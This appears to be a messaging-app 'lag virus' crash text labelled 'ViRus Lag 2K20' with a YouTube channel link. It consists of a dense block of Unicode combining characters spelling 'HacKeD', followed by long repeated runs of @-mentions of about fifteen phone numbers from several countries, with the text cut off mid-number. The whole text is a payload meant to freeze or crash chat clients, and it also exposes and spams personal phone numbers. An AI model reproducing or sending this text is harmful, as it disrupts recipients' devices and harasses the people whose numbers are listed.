812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* Ȟ̵̨̢̡̡̢̡̡̢̧̢̢̛̪̙̣͍̯͎͍̫̟̫͇̼̠̯̮͕̭̗̪̯̩͕̙̣̭̭̼͕̘̜͖͎̺̬͚̬̻̲̣͚͈̦̯͖̮̤͙̼̰̩͕̬̫̥͓̜͖̙̙̗̪̮͙̙̮̫̱̪̩̠̲̰̦̠̰̟̙̀̿̈́̋́̀̌͐͑̃̈̏̀̈́͑̎̑͂̌̆̆͗̔̿́̈́̉͊̒̔̀͂͋̐̒͂̓̎̓̇́̓́́̓̈́̓͌̈́̔̽̎͋̉̊̾̀͊̏͂̀͆̈́͌̑̽͘̕̕̕͜͜͜͜͝͝͝ͅa̵̡̨̛̛̛̛̛̛̛̛̛̫̘̺̠͚̞̤̹̩͔̯̠̣͍͚͕̩̲̭̼͈̠̫̲̱̹̫̥̘̭̩̱̰̥͎̮̘̙̤͔͎̤͖̙͇̪͌̑͌̎̈̔͊͒̈̈́̓̅̽̄͌͂̓͒̆̎́̍̐̐̔̏̎̈́̈́̎̈́́̓̆͂͛́͂̒̀̉̒̾͛͊͛̿̐̓͋̋̾͌̊͐͑͗̆̎͗̾͗͊̀͋̓̌͌͑͛̎͋̈́̾̈̓̓̿̔͗̿̂̽̆̌͂̽̀̉̊͑̋̉͒͌̂̋͛͆̉͑̊̾̀͛̈́̌͑́̆̎́́͊̿̿̄͗̓̈́̽̾̉̍͋̇̒̊̈́̓̑͌̾̉̿͊̽͊̒̍̇́́̑̃͗͂̅̆̋͑̍̽̑̍̽̋̇͊͑̀̉̈́̌́̓̓́̉̽̓͊̈̎̍͊̍͑̋̒͊̃̏̄̍̔̒̈́̈́̂̉̌̽͂̐̽̏̌̋̔̎͗̅͐̊̾̀̓́̈́̌̎̐̏̿̀̂̐̅̈͂̃̎̈̆͂̏̀̿́̀̓̌̐͛̏͐̇̎̎́͊͌͛̎̌̚͘͘̕̚̕̚̚͘̚͘̚͘͘̚̕͜͠͝͠͝͝͝͝͠͝͠͝͠͝ç̵̨̨̧̧̢̡̢̧̧̨̢̡̥̝͍̬͉̖̝͓̗̘̩͔̤̙̠̱̮͎̫̳̱̹̤̗̟̪̻̖̳̺̫̮̭͓̟͙̮̲͔͉͚̲͓̭͓̬̩͉̰̥̮̳̬͔͔̗̪̫͉͚͓̼͕͇̻͖̤̬̝̫͍͚̻̙̱̭̭̱͕̘̬͚̜̞̞̻͔̲̘̞̻͙̘͙͍̣̼͓̺̦͒̆͑̆̏̍́̾̓̌͒͗͗̀̄̐̒̒̐̀͗̃͌́̂͑̄̏̓̀̑̐̈́̂͒̈̔͑̏̈́̀̎̂̿̋͂͐̍̊̋͘̚͜͜͜͠͝͝͠͝͠͠ͅͅͅͅͅͅĶ̷̡̢̨̧̧̨̡̡̧̧̡̛̛̛̝̺̥͕̦̦̼̗̮͚̞͚̣̪̬̫̣͙̦̺̟̯̲͚̪̹͓̭̜̲̲̯̦̟̘̩̝̗̪̻̻̣̫̯͈͓̪̖̥̮̟͓̺̖͎͎̼̬͖̬͇̦̩̰̝̲̳̞̗̼͈̼̘̙̝͇̙̟̤͕̘̼̫̳̩̩̱͈̝̫̪͓̞͕͈͎͎̱͎͈͇̰̘̤͍̮͖̟̳̘̱͉̫̤͙̰̙̱͉̙̲̳̜̲̬̗͓̰̹̠͓͉̟̺̭͉̝͚̖͖̟̫͙͙̹͖̘̳̙̝̳̜̝͚̞̱̲̬̏̈̀̐̌̊̍͒̆͊̑̓̉͂̔̓̏͑̆̎́̐̿̐͊͛̋͋̓̐̔͋̆̄͌̿͑͒̈̽͑͒͛̒̉̽̋̑͊̓̏́̈́̀̒̈́͋͐̈́͒̉͐̋̽̿̽̃̽̔̃̇̒̇̿͋͐̑̂̇̑́̄̓͑̀̈́̈́͆͆̍̆͂̃͊̅͊̄͆̀̆̌̄͂̊̑̈́̆͑̀̇̂̕͘̚̕͘̕͘͜͜͜͜͜͝͠͝͝͝͝͠͠͝ͅͅͅͅȩ̴̧̛͖̟̹͎̲̙̗̦̝͍̖̤̮͍̼̣̫̹̦̱̥̠̦̘̞̳̩̗͇̗͔̘̦̠̦͓͈͖̙̖͖͍̬͉̘̮̲̞̻̘̞͎̣̮͓̼̪͚̙͔͓̭̼͍̥̤̥͈̻̻̮̮̩͈͈̣̫̤̘̜̥̤͎̩̤͕̄̐̄̎́͐̈́̔̾̈̆͗̄́͑̓̒̓͌̋̊́́̀̎͋̈́̀̋̏̉́̓͌̈̍̓͆͋̚̕̕̕͘͜͜͜͜͝͝͝͠͝D̶̨̧̢̢̧̢̨̡̢̛̛̛̛̛̛̛̲̤͓̫̙̝̻̤̜̤͎̥͔̩̹̟̲̱͍̥͓̮͖̠͔̩͇͓̙̬̯̙̹͚̜̗̳̪̙̩̯̱͓̺̗͉̗̰̫̻̬͙̥̟̠̻̩͔̩̥̩̪͉͓̜͎̻̭̦͓͓̜͓͈̫̝̤͎̞͕̭̤̟̻̂̓̊̏̓͐͆̽̒́̍̑̊̂͂̿̎̉̈́̉͐͆̇͆̒͂͗̄͒̂̈́͒̉͐̋́̃͋̍̾̈́͗̈́͒͗̇̔͂̀̐̀͛̏͐͂̄͐̀̿̀̆͆̈͆̒̇̾̍̀͗̉͐̀́͛̍́̈́̇͋̍̊̉̈́͊̓͊̈́̈͆̈́̓̍̌͋̈̇̒̏͗̈́͂͊͊͒͂̄̍̅̾̉͗̈́͌̽́̓́̓̈́̏͂͗̎̓͂̓̆̿͌̋͆͛̀͑̾̓̓̈̄̈́̈́̿̓̑̔̊͌̒̌̿̍̈́̂͆̈́͋̇̈́̾̐̒̍̒̈͆̉͗́̅̉̄͋̑̌͒̽̐̾̒̈̏̑̐̆͑̇̑̌̾͒̃̐̆͌̄͌͌̏̃̽̂̑̋̀̇̈̑͊͋͗̓̈́͆͊͌̆̓̒̇̍̇̇͛̌̉̈́̒́́̀̊̒̊́͆̕͘̕͘̕̚̕̚̕̚͘͘̕̚͘̕͘͘͜͜͠͝͠͝͠͝͝͠͝͠͠͝͝͝͠͝͝͝ͅͅ ViRus Lag 2K20 https://youtube.com/c/HYPERMOD *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 